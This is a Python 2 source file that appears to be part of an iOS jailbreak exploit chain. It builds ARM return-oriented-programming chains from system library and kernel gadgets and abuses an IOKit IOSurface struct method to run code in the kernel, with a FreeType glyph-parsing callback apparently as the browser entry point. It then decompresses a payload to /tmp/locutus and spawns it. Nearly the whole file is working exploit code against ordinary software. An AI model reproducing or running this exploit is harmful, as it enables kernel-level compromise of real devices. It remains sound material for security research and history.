#!/opt/local/bin/python2.6
import sys, base64, shlex, zlib, os
import dmini
from world1 import *
import goo
import cPickle as pickle

MAP_ANON = 0x1000
MAP_SHARED = 0x0001

O_WRONLY = 0x0001
O_CREAT  = 0x0200
O_TRUNC  = 0x0400

PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4

four_dot_three = '4.3' in os.environ['VERSION']

if len(sys.argv) != 5:
    print >> sys.stderr, "usage: python catalog.py dejavu|two cache kern patchfile"
    sys.exit(1)

mode, cachefile, kernfile, patchfile = sys.argv[1:]
assert mode in ['dejavu', 'two']
patchfp = open(patchfile)

lib_paths = set(['/usr/lib/libSystem.B.dylib'])
def add_lib(short, path):
    dmini.cur.add_lib(short, path)
    lib_paths.add(path)

debugging = True

def dbg_result():
    if debugging:
        result, resultp = stackunkpair()
        store_r0_to(resultp)
        back = sys._getframe().f_back
        if mode == 'two':
            funcall('_fprintf', console, ptr('Result for %s:%d was %%08x\n' % (back.f_code.co_filename, back.f_lineno), True), result, load_r0=True)
        else:
            funcall('_syslog', 0, ptr('Result for %s:%d was %%08x' % (back.f_code.co_filename, back.f_lineno), True), result)

dmini.init(cachefile, True)

dmini.init(kernfile, False)

sysent = dmini.cur.find_basic('- 00 10 86 00') + 4

code_addr = 0x80000400 # XXX
weirdfile = dmini.Connection('kcode.o', rw=True).relocate(dmini.cur, code_addr).nth_segment(0)[:-8]
count = 0
stuff = ''
while True:
    namelen = patchfp.read(4)
    if namelen == '': break
    name = patchfp.read(struct.unpack('I', namelen)[0])
    addr, = struct.unpack('I', patchfp.read(4))
    data = patchfp.read(struct.unpack('I', patchfp.read(4))[0])
    if addr == 0 or len(data) == 0 or name.startswith('+'): # in place only
        continue
    stuff += I(addr, len(data)) + data
    count += 1
weirdfile = pointed(weirdfile + I(sysent, count) + stuff)

def mov_r3_r7():
    # push {r1, r3, r6, r7, lr}
    # pop  {r0, r1, r2, r3, r5, r7, pc}
    set_fwd('PC', dmini.cur.find_basic('+ ca b5 af bd'))
    exhaust_fwd('R0', 'R1', 'R2', 'R3', 'R5', 'R6', 'R7', 'LR')
    heapadd(fwd('R7'), fwd('PC'))


# not anymore   e89bb951	ldm	fp, {r0, r4, r6, r8, fp, ip, sp, pc}
#               e89bed06 	ldm	fp, {r1, r2, r8, sl, fp, sp, lr, pc}
kernel_ldm = dmini.cur.find_basic('- 06 ed 9b e8')
init('R1', 'R2', 'R8', 'R10', 'R11', 'SP', 'LR', 'PC')
m = pointed('')
set_fwd('SP', pointer(m))
heapadd(m)
mov_r3_r7()
make_r4_avail()
funcall('_copyin', pointer(weirdfile), code_addr, len(weirdfile))
funcall('_flush_dcache', code_addr, len(weirdfile), 0)
set_fwd('PC', code_addr)

kstuff = finalize(None, must_be_simple=False)
#heapdump(kstuff)
assert len(kstuff) == 0x70

dmini.init(cachefile, True)

add_lib('ft', '/System/Library/Frameworks/CoreGraphics.framework/Resources/libCGFreetype.A.dylib')
add_lib('iosurface', '/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface')
add_lib('iokit', '/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit')
add_lib('libz', '/usr/lib/libz.dylib')

if four_dot_three:
    def wrap(num):
        if (num & 0xf0000000) == 0x30000000:
            return reloc(3, num, alignment=0x1000)
        else:
            return num
    dmini.cur.wrap = wrap

if mode == 'dejavu':
    init('R4', 'R5', 'PC')
    make_r7_avail()
    set_sp_to_sp()
    make_avail()
    load_r0_from(reloc(0xe, 0x558))
    load_r0_r0()
    zlocutusp, zlocutuspp = stackunkpair()
    store_r0_to(zlocutuspp)
else:
    init('R8', 'R10', 'R11', 'R4', 'R5', 'R6', 'R7', 'PC')
    make_avail()
    if debugging:
        console = ptrI(0)
        funcall('_fopen', ptr('/dev/console', True), ptr('a', True))
        store_r0_to(console)

funcall('_mach_task_self')
task_self, task_self_p = stackunkpair()
store_r0_to(task_self_p)

kstuffp = ptr(kstuff)

transaction = troll_string('\x00' * 0xd8)
transaction[0:4] = transaction[4:8] = I(0xeeeeeeee)
transaction[8:0xc] = I(kstuffp) # surface saved in r11
transaction[0x58:0x5c] = I(kernel_ldm)
transaction[0xb8:0xbc] = I(6) # run iterations 1 and 2 (first loop bails at 1)
transaction = simplify(transaction)
assert len(transaction) == 0xd8

# The manpage says this returns EINVAL, but in fact the kernel handles it.
funcall('_mlock', kstuffp, len(kstuff)); dbg_result()

zerop = ptrI(0)

if mode == 'two':
    # XXX is this necessary? it's from star
    funcall('iokit._IOKitWaitQuiet', 0, ptrI(0, 0, 0))

# XXX this won't work at boot because there is no notify!
funcall('iokit._IOServiceMatching', ptr('AppleRGBOUT', True))
#funcall('iokit._IOServiceMatching', ptr('AppleCLCD', True))
matching, matchingp = stackunkpair()
store_r0_to(matchingp)
funcall('iokit._IOServiceGetMatchingService', 0, matching)
connect = ptrI(0)
funcall('iokit._IOServiceOpen', None, task_self, 0, connect); dbg_result()

# XXX In Safari, I need to kill this
funcall('iokit._IOConnectCallScalarMethod', connect, 21, ptrI(0xeeeeeeee, 0xeeeeeeee), 2, 0, 0, load_r0=True); dbg_result()

funcall('iokit._IOConnectCallStructMethod', connect, 5, ptr(transaction), len(transaction), 0, 0, load_r0=True); dbg_result()
#funcall('_sleep', 1000)
#dbg_result(); funcall('_abort')


# do some housekeeping
# (but don't bother if we're going to exec)
if mode == 'dejavu':
    funcall('iokit._IOServiceClose', connect, load_r0=True)
    funcall('_munlock', kstuffp, len(kstuff)); dbg_result()

    # the boring stuff

    funcall('_malloc', reloc(0xa, 0))
    locutusp, locutuspp = stackunkpair()
    store_r0_to(locutuspp)
    funcall('libz._uncompress', None, ptrI(reloc(0xa, 0)), zlocutusp, reloc(0xb, 0)); dbg_result()
    locutus_str = ptr('/tmp/locutus', True)
    funcall('_open', locutus_str, O_WRONLY | O_CREAT | O_TRUNC, 0755)
    fd, fdp = stackunkpair()
    store_r0_to(fdp)
    #dbg_result()
    funcall('_write', None, locutusp, reloc(0xa, 0))
    dbg_result()
    funcall('_close', fd)
    dbg_result()
    funcall('_posix_spawn', 0, locutus_str, 0, 0, zerop, zerop)
    dbg_result()

if mode == 'dejavu':
    set_r0_to(1337)
    fancy_set_sp_to(reloc(0xe, 0x60c)) # offset determined by experiment
else:
    lunchd = ptr('/sbin/lunchd', True)
    funcall('_execl', lunchd, lunchd, 0)

goo.sheap.append(weirdfile)

if mode == 'dejavu':
    final = pad(finalize(reloc(0xd, 0)), 4)

    #.long 0xbd64b062
    #.long 0xbd60b060
    #.long 0xbd30b050
    #.long 0xbd49b060
    
    # add sp, #392; pop {r2, r5, r6, pc}
    parse_callback = dmini.cur.find_basic('+ 50 b0 30 bd').value
    actual_parse_callback = dmini.cur.private_sym('ft._T1_Parse_Glyph').value

    final = final.unpack()

    open('dejavu.txt', 'w').write(pickle.dumps({'parse_callback': parse_callback, 'actual_parse_callback': actual_parse_callback, 'final': final}))
else:
    # for two.py
    initializer = dmini.cur.find_basic('+ 5f 13 77 47') # asrs r7, r3, #13; bx lr
    init_sp = 0x10031000
    address = 0x8000

    final = finalize(address)
    #heapdump(final)
    open('two.txt', 'w').write(pickle.dumps({'segment': final, 'initializer': initializer, 'init_sp': init_sp, 'rop_address': address, 'libs': lib_paths}))
